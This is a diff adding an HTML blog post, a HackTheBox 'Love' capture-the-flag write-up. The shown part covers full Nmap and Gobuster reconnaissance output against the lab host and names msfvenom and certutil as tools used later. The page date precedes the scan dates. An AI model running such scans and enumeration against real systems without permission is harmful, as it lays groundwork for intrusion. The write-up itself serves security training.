@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Love Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Love.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Love Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Love.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-love/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Love Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Love.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-08-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-08-07T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-love/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-love/">
+              HTB: Love Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2020-08-07T00:00:00Z">
+                August 7, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Love</p>
+<p>IP Address: 10.10.10.239</p>
+<p>Difficulty: Easy</p>
+<p>Summary: HackTheBox&rsquo;s Love was a straightforward box that required an understanding of how to perform validation against untrusted user input into web applications, perform server-side request forgery, and exploit a misconfiguration of user privileges in order to install software and run arbitrary commands as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p>Tools Used: Nmap, Gobuster, msfvenom, certutil, winPEAS</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As always, I began with an Nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Nmap 7.91 scan initiated Fri Jul  9 05:50:44 2021 as: nmap -sC -sV -p- -oA nmap 10.10.10.239
+</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"></span>Nmap scan report for 10.10.10.239
+</span></span><span style="display:flex;"><span>Host is up (0.097s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65516 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>|_http-title: Voting System using PHP
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>|_http-title: 403 Forbidden
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-01-18T14:00:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2022-01-18T14:00:16
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+</span></span><span style="display:flex;"><span>3306/tcp  open  mysql?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, HTTPOptions, Help, JavaRMI, LDAPSearchReq, NCP, RTSPRequest, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
+</span></span><span style="display:flex;"><span>|_    Host &#39;10.10.14.4&#39; is not allowed to connect to this MariaDB server
+</span></span><span style="display:flex;"><span>5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>|_http-title: 403 Forbidden
+</span></span><span style="display:flex;"><span>5040/tcp  open  unknown
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=LOVE
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:LOVE, DNS:Love
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-04-11T14:39:19
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-04-10T14:39:19
+</span></span><span style="display:flex;"><span>|_ssl-date: 2021-07-09T06:36:10+00:00; +33m08s from scanner time.
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>7680/tcp  open  pando-pub?
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port3306-TCP:V=7.91%I=7%D=7/9%Time=60E7E5F1%P=x86_64-pc-linux-gnu%r(HTT
+</span></span><span style="display:flex;"><span>SF:POptions,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20
+</span></span><span style="display:flex;"><span>SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(RTSPReq
+</span></span><span style="display:flex;"><span>SF:uest,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allo
+</span></span><span style="display:flex;"><span>SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(DNSStatusRe
+</span></span><span style="display:flex;"><span>SF:questTCP,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20
+</span></span><span style="display:flex;"><span>SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(Help,49
+</span></span><span style="display:flex;"><span>SF:,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20
+</span></span><span style="display:flex;"><span>SF:to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(TerminalServerCook
+</span></span><span style="display:flex;"><span>SF:ie,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowe
+</span></span><span style="display:flex;"><span>SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(TLSSessionReq
+</span></span><span style="display:flex;"><span>SF:,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\
+</span></span><span style="display:flex;"><span>SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(SMBProgNeg,49,&#34;
+</span></span><span style="display:flex;"><span>SF:E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20to
+</span></span><span style="display:flex;"><span>SF:\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(X11Probe,49,&#34;E\0\0\x
+</span></span><span style="display:flex;"><span>SF:01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20to\x20con
+</span></span><span style="display:flex;"><span>SF:nect\x20to\x20this\x20MariaDB\x20server&#34;)%r(LDAPSearchReq,49,&#34;E\0\0\x01
+</span></span><span style="display:flex;"><span>SF:\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20to\x20conne
+</span></span><span style="display:flex;"><span>SF:ct\x20to\x20this\x20MariaDB\x20server&#34;)%r(SIPOptions,49,&#34;E\0\0\x01\xffj
+</span></span><span style="display:flex;"><span>SF:\x04Host\x20&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20to\x20connect\x2
+</span></span><span style="display:flex;"><span>SF:0to\x20this\x20MariaDB\x20server&#34;)%r(NCP,49,&#34;E\0\0\x01\xffj\x04Host\x20
+</span></span><span style="display:flex;"><span>SF:&#39;10\.10\.14\.4&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\
+</span></span><span style="display:flex;"><span>SF:x20MariaDB\x20server&#34;)%r(JavaRMI,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\
+</span></span><span style="display:flex;"><span>SF:.14\.4&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
+</span></span><span style="display:flex;"><span>SF:DB\x20server&#34;)%r(WMSRequest,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.
+</span></span><span style="display:flex;"><span>SF:4&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x2
+</span></span><span style="display:flex;"><span>SF:0server&#34;)%r(oracle-tns,49,&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.4&#39;\x2
+</span></span><span style="display:flex;"><span>SF:0is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serv
+</span></span><span style="display:flex;"><span>SF:er&#34;);
+</span></span><span style="display:flex;"><span>Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2h18m09s, deviation: 3h30m02s, median: 33m08s
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_10::-
+</span></span><span style="display:flex;"><span>|   Computer name: Love
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: LOVE\x00
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP\x00
+</span></span><span style="display:flex;"><span>|_  System time: 2021-07-08T23:35:57-07:00
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: 
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled (dangerous, but default)
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.02: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2021-07-09T06:35:55
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Nmap done at Fri Jul  9 06:03:03 2021 -- 1 IP address (1 host up) scanned in 739.20 seconds
+</span></span></span></code></pre></div><p>In addition to that, I ran a gobuster scan against the main web page at port 80:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">Gobuster v3.1.0</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Url</span>:<span style="color:#6e7681">                     </span><span style="color:#a5d6ff">http://10.10.10.239</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Method</span>:<span style="color:#6e7681">                  </span><span style="color:#a5d6ff">GET</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Threads</span>:<span style="color:#6e7681">                 </span><span style="color:#a5d6ff">100</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Wordlist</span>:<span style="color:#6e7681">                </span><span style="color:#a5d6ff">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Negative Status codes</span>:<span style="color:#6e7681">   </span><span style="color:#a5d6ff">404</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] User Agent</span>:<span style="color:#6e7681">              </span><span style="color:#a5d6ff">gobuster/3.1.0</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">[+] Timeout</span>:<span style="color:#6e7681">                 </span><span style="color:#a5d6ff">10s</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">2021</span><span style="color:#a5d6ff">/07/09 06:01:06 Starting gobuster in directory enumeration mode</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/images               (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">338</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/images/]</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/Images               (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">338</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/Images/]</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/admin                (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">337</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/admin/] </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/plugins              (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">339</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/plugins/]</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/includes             (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">340</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/includes/]</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/dist                 (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">336</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/dist/]    </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/licenses             (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">421</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/examples             (Status: 503) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">402</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/IMAGES               (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">338</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/IMAGES/]  </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%20                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/Admin                (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">337</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/Admin/]   </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*checkout*           (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/Plugins              (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">339</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/Plugins/] </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/phpmyadmin           (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/webalizer            (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*docroot*            (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*                    (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/con                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/http%3A              (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/Includes             (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">340</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/Includes/]</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/**http%3a            (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*http%3A             (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/aux                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/Dist                 (Status: 301) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">336</span>]<span style="color:#6e7681"> </span>[--<span style="color:#a5d6ff">&gt; http://10.10.10.239/Dist/]    </span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/**http%3A            (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C0                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/server-status        (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">421</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%3FRID%3D2671        (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
